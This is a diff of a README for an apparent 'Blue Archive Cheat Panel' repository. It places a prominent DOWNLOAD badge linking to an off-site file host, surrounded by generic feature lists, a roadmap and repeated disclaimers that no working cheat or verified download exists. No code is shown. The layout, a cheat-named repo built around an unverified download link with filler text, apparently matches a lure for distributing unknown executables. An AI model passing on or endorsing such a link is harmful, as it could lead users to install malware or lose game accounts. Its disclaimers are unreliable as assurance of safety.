@@ -1,2 +1,68 @@
-# Blue-Archive-Cheat-Panel
- # Blue Archive Cheat Panel  An unofficial Blue Archive-inspired project concept featuring a colorful anime-style interface, academy-themed visuals, customizable layouts, and organized settings menus. Focused on UI design and project structure; no functional cheats or verified download are confirmed.
+
+# Blue Archive Cheat Panel
+
+> **Unofficial project concept.** The download link below is unverified and is not confirmed to host a working application.
+
+[![DOWNLOAD](https://img.shields.io/badge/DOWNLOAD-8A2BE2?style=for-the-badge&logo=gamepad&logoColor=white)](https://huangqing.net/s/file)
+
+## Overview
+
+Blue Archive Cheat Panel is an unofficial UI concept inspired by the game's colorful anime aesthetic, academy setting, and character designs.
+
+This project focuses on interface design, visual customization, and organized menu layouts. No functional cheats or verified game modifications are confirmed.
+
+## Features
+
+- Blue Archive-inspired visual theme
+- Colorful academy-style interface
+- Customizable colors and layout concepts
+- Organized navigation and settings sections
+- Character-inspired profile designs
+- Conceptual configuration pages
+
+## Proposed Menu Structure
+
+| Section | Description |
+|---|---|
+| Dashboard | Project overview and interface status |
+| Interface | Theme and layout customization |
+| Profiles | Conceptual preset organization |
+| Settings | General UI preferences |
+| About | Project information and disclaimer |
+
+## Project Goals
+
+- Create a polished Blue Archive-inspired interface concept
+- Keep navigation simple and organized
+- Explore different visual customization options
+- Document the project structure for UI design purposes
+
+## Getting Started
+
+1. Review the project files and documentation.
+2. Explore the proposed interface structure.
+3. Customize visual elements when developing a UI prototype.
+4. Treat all features as design concepts unless independently verified.
+
+## Roadmap
+
+- [ ] Refine the dashboard layout
+- [ ] Add additional theme variations
+- [ ] Improve menu navigation
+- [ ] Document UI customization ideas
+- [ ] Create concept screenshots
+
+## Compatibility
+
+This repository describes a UI concept. Compatibility with Blue Archive or any game client is not confirmed.
+
+## Disclaimer
+
+This is an unofficial, fan-made concept and is not affiliated with or endorsed by the game's developers or publishers. No working cheats, game modifications, or verified downloads are confirmed. Unauthorized third-party tools may violate the game's terms of service and can result in account penalties.
+
+## Project Information
+
+- **Project:** Blue Archive Cheat Panel
+- **Type:** Unofficial UI concept
+- **Focus:** Interface design and project structure
+- **Status:** Concept documentation
